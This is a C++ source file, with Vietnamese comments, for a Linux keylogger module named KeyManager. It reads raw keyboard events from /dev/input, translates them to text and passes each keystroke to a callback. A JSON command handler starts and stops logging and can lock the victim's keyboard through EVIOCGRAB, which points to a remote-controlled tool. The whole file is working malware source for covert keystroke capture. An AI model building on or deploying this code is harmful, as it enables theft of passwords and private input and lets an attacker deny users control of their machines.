#include "KeyManager.hpp"

// --- BIẾN TOÀN CỤC ---
static KeyCallback g_callback = nullptr;
static std::atomic<bool> g_running{false};
static std::atomic<bool> g_isLocked{false}; // Biến trạng thái khóa
static int g_fd = -1; // File descriptor của bàn phím

// Trạng thái phím bổ trợ
static bool g_isCtrl = false;
static bool g_isAlt = false;
static bool g_isShift = false;

json KeyManager::handle_command(const json& request) {
    std::string command = request.value("command", "");
    
    if (command == "START") {
        start_hook();
        return {
            {"status", "success"}, 
            {"module", get_module_name()},
            {"data", "Keylogger started"}};
    }
    else if (command == "STOP") {
        stop_hook();
        return {
            {"status", "success"}, 
            {"module", get_module_name()},
            {"error", "Keylogger stopped"}};
    }
    else if (command == "LOCK") {
        if (g_fd == -1) start_hook();
        set_locked(true);
        return {{"status", "success"}, {"message", "Keyboard LOCKED. Press Ctrl+Alt+U to unlock locally."}};
    }
    else if (command == "UNLOCK") {
        set_locked(false);
        return {{"status", "success"}, {"message", "Keyboard UNLOCKED"}};
    }

    return {
        {"status", "error"}, 
        {"module", get_module_name()},
        {"error", "Unknown command"}};
}
static std::map<int, std::string> g_keyMap = {
    {KEY_A, "a"}, {KEY_B, "b"}, {KEY_C, "c"}, {KEY_D, "d"}, {KEY_E, "e"},
    {KEY_F, "f"}, {KEY_G, "g"}, {KEY_H, "h"}, {KEY_I, "i"}, {KEY_J, "j"},
    {KEY_K, "k"}, {KEY_L, "l"}, {KEY_M, "m"}, {KEY_N, "n"}, {KEY_O, "o"},
    {KEY_P, "p"}, {KEY_Q, "q"}, {KEY_R, "r"}, {KEY_S, "s"}, {KEY_T, "t"},
    {KEY_U, "u"}, {KEY_V, "v"}, {KEY_W, "w"}, {KEY_X, "x"}, {KEY_Y, "y"}, {KEY_Z, "z"},
    {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"}, {KEY_5, "5"},
    {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"}, {KEY_0, "0"},
    {KEY_ENTER, "[ENTER]\n"}, {KEY_SPACE, " "}, {KEY_BACKSPACE, "[BACKSPACE]"},
    {KEY_TAB, "[TAB]"}, {KEY_ESC, "[ESC]"}, 
    {KEY_LEFTSHIFT, "[SHIFT]"}, {KEY_RIGHTSHIFT, "[SHIFT]"},
    {KEY_LEFTCTRL, "[CTRL]"}, {KEY_RIGHTCTRL, "[CTRL]"},
    {KEY_LEFTALT, "[ALT]"}, {KEY_RIGHTALT, "[ALT]"},
    {KEY_CAPSLOCK, "[CAPS]"},
    {KEY_MINUS, "-"}, {KEY_EQUAL, "="}, {KEY_LEFTBRACE, "["}, {KEY_RIGHTBRACE, "]"},
    {KEY_SEMICOLON, ";"}, {KEY_APOSTROPHE, "'"}, {KEY_GRAVE, "`"},
    {KEY_BACKSLASH, "\\"}, {KEY_COMMA, ","}, {KEY_DOT, "."}, {KEY_SLASH, "/"}
};

// Map cho Shift (Ký tự đặc biệt)
static std::map<int, std::string> g_shiftMap = {
    {KEY_1, "!"}, {KEY_2, "@"}, {KEY_3, "#"}, {KEY_4, "$"}, {KEY_5, "%"},
    {KEY_6, "^"}, {KEY_7, "&"}, {KEY_8, "*"}, {KEY_9, "("}, {KEY_0, ")"},
    {KEY_MINUS, "_"}, {KEY_EQUAL, "+"}, {KEY_LEFTBRACE, "{"}, {KEY_RIGHTBRACE, "}"},
    {KEY_SEMICOLON, ":"}, {KEY_APOSTROPHE, "\""}, {KEY_GRAVE, "~"},
    {KEY_BACKSLASH, "|"}, {KEY_COMMA, "<"}, {KEY_DOT, ">"}, {KEY_SLASH, "?"}
};

std::string find_keyboard_device() {
    const std::string path_dir = "/dev/input/by-path/";
    DIR* dir = opendir(path_dir.c_str());
    if (!dir) return "";

    struct dirent* entry;
    std::string device_path = "";

    while ((entry = readdir(dir)) != NULL) {
        std::string filename = entry->d_name;
        // Tìm file kết thúc bằng "-event-kbd"
        if (filename.length() > 10 && 
            filename.substr(filename.length() - 10) == "-event-kbd") {
            device_path = path_dir + filename;
            break;
        }
    }
    closedir(dir);
    
    if (device_path.empty()) return "/dev/input/event0";
    return device_path;
}

std::string ProcessKey(int code, int value) {
    // Cập nhật trạng thái phím bổ trợ
    if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL) g_isCtrl = (value > 0);
    if (code == KEY_LEFTALT || code == KEY_RIGHTALT)   g_isAlt = (value > 0);
    if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT) g_isShift = (value > 0);

    // Chỉ xử lý khi nhấn xuống (value == 1) hoặc giữ (value == 2)
    if (value == 0) return "";

    std::string output = "";
    
    // Xử lý Shift cho các ký tự đặc biệt
    if (g_isShift && g_shiftMap.count(code)) {
        return g_shiftMap[code];
    }

    if (g_keyMap.count(code)) {
        output = g_keyMap[code];
        // Xử lý viết hoa (Chưa tính CapsLock để đơn giản hóa)
        if (g_isShift && output.length() == 1 && output[0] >= 'a' && output[0] <= 'z') {
            output[0] -= 32; // a -> A
        }
    }
    return output;
}

// --- VÒNG LẶP CHÍNH ---
void hook_loop() {
    std::string dev_path = find_keyboard_device();
    g_fd = open(dev_path.c_str(), O_RDONLY);
    
    if (g_fd == -1) {
        std::cerr << "[KEYBOARD] Failed to open device: " << dev_path << " (ROOT required?)\n";
        g_running = false;
        return;
    }

    struct input_event ev;
    while (g_running) {
        ssize_t n = read(g_fd, &ev, sizeof(ev));
        if (n == (ssize_t)-1) break;

        if (ev.type == EV_KEY) {
            int code = ev.code;
            int val = ev.value; // 0=Up, 1=Down, 2=Repeat

            // 1. CẬP NHẬT TRẠNG THÁI MODIFIER (Luôn chạy để bắt đúng combo)
            if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL) g_isCtrl = (val > 0);
            if (code == KEY_LEFTALT || code == KEY_RIGHTALT)   g_isAlt = (val > 0);

            // 2. XỬ LÝ KHÓA PHÍM & CỨU HỘ
            if (g_isLocked) {
                // Kiểm tra combo Ctrl + Alt + U
                if (g_isCtrl && g_isAlt && code == KEY_U && val == 1) {
                    std::cout << "[KEYBOARD] EMERGENCY UNLOCK TRIGGERED!\n";
                    
                    // Mở khóa: Tắt Grab
                    g_isLocked = false;
                    ioctl(g_fd, EVIOCGRAB, 0); 
                    
                    continue; // Bỏ qua sự kiện phím U này
                }

                // Nếu đang khóa -> Không log, không làm gì cả 
                // (Vì đã Grab rồi nên hệ điều hành cũng không nhận được phím)
                continue; 
            }

            // 3. NẾU KHÔNG KHÓA -> CHẠY KEYLOGGER
            // Chỉ log khi nhấn xuống (val == 1)
            if (val == 1) {
                std::string str = ProcessKey(code, val);
                if (!str.empty() && g_callback) {
                    g_callback(str);
                }
            }
        }
    }
    close(g_fd);
    g_fd = -1;
}

void KeyManager::set_locked(bool locked) {
    if (g_fd == -1) return; // Chưa chạy thì không lock được

    g_isLocked = locked;
    
    // LINUX MAGIC: EVIOCGRAB
    // 1 = Chiếm quyền điều khiển bàn phím (OS không nhận được phím nữa -> Lock)
    // 0 = Trả lại quyền
    int result = ioctl(g_fd, EVIOCGRAB, locked ? 1 : 0);
    
    if (result == 0) {
        std::cout << "[KEYBOARD] Lock state: " << (locked ? "LOCKED (Grabbed)" : "UNLOCKED") << std::endl;
    } else {
        perror("[KEYBOARD] Failed to change lock state");
    }
}

void KeyManager::set_callback(KeyCallback cb) {
    g_callback = cb;
}

void KeyManager::start_hook() {
    if (g_running) return; // Đang chạy rồi thì bỏ qua
    
    g_running = true;
    
    hookThread = std::thread(hook_loop);
    hookThread.detach(); // Tách thread để nó chạy ngầm
}

void KeyManager::stop_hook() {
    g_running = false;
    // Mở khóa trước khi dừng để tránh kẹt bàn phím
    if (g_isLocked && g_fd != -1) {
        ioctl(g_fd, EVIOCGRAB, 0);
        g_isLocked = false;
    }
    // Đóng file để ngắt read()
    if (g_fd != -1) {
        close(g_fd);
        g_fd = -1;
    }
}
